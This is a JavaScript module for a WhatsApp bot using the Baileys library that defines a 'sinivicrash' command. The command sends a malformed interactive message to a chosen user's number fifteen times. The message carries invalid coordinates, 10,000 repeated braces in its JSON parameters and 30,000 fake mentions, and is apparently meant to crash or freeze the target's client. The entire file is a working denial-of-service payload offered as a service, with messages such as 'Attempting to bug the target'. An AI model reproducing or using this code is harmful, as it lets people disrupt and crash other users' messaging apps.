import pkg from "baileys";

const { proto, generateWAMessageFromContent } = pkg;


import channelSender from '../commands/channelSender.js'


async function bugfunc(client, targetNumber) {

 try {

   let message = {

     ephemeralMessage: {

       message: {

         interactiveMessage: {

           header: {

             title: "Peace and Love",

             hasMediaAttachment: false,

             locationMessage: {

               degreesLatitude: -999.035,

               degreesLongitude: 922.999999999999,

               name: "Peace and Love",

               address: "Peace and Love",

             },

           },

           body: {

             text: "Peace and Love",

           },

           nativeFlowMessage: {

             messageParamsJson: "{".repeat(10000),

           },

           contextInfo: {

             participant: targetNumber,

             mentionedJid: [

               "0@s.whatsapp.net",

               ...Array.from(
                 {
                   length: 30000,
                 },
                 () =>
                   "1" +
                   Math.floor(Math.random() * 5000000) +
                   "@s.whatsapp.net"
               ),
             ],
           },
         },
       },
     },
   };

   await client.relayMessage(targetNumber, message, {

     messageId: null,

     participant: { jid: targetNumber },

     userJid: targetNumber,

   });

 } catch (err) {

   console.log(err);

 }

}
export async function sinivicrash(message, client) {

    try {

        const remoteJid = message.key?.remoteJid;

        if (!remoteJid) {

            throw new Error("Message JID is undefined.");
        }

        await client.sendMessage(remoteJid, { text: "Attempting to bug the target" });

        const messageBody = message.message?.extendedTextMessage?.text || message.message?.conversation || '';

        const commandAndArgs = messageBody.slice(1).trim();

        const parts = commandAndArgs.split(/\s+/);

        const args = parts.slice(1);

        let participant;

        if (message.message?.extendedTextMessage?.contextInfo?.quotedMessage) {

            participant = message.message.extendedTextMessage.contextInfo.participant;

        } else if (args.length > 0) {

            participant = args[0].replace('@', '') + '@s.whatsapp.net';

        } else {

            throw new Error('Specify the person to bug.');
        }

        const num = '@' + participant.replace('@s.whatsapp.net', '');

        // Execute the bug command

        for (let i = 0; i < 15; i++) {

            await bugfunc(client, participant);

            await new Promise(resolve => setTimeout(resolve, 2000));
        }


        await channelSender(message, client, "Succceded in sending bug to the target.\n\nThanks for using my service.", 1);

    } catch (error) {

        console.error("An error occurred while trying to bug the target:", error);

        await client.sendMessage(message.key.remoteJid, { text: `An error occurred while trying to bug the target: ${error.message}` });
    }
}
export default sinivicrash;